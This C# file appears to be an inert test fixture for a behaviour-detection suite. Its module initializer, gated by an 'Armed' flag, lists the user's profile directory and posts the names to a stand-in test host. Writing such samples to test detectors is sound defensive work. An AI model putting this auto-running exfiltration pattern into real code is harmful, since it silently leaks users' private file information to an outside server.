// Inert fixture: never executed (gated by Arm.Armed). BF06 malicious: a module initializer that lists the user profile and posts it.
using System;
using System.IO;
using System.Net.Http;
using System.Runtime.CompilerServices;

namespace Behaviour
{
    internal static class ModuleStart
    {
        [ModuleInitializer]
        internal static void Run()
        {
            if (!Arm.Armed) return;
            var profile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var names = string.Join("\n", Directory.GetFileSystemEntries(profile));
            using var client = new HttpClient();
            client.PostAsync("https://example.test/silvergun-behaviour-suite/list", new StringContent(names)).GetAwaiter().GetResult();
        }
    }
}
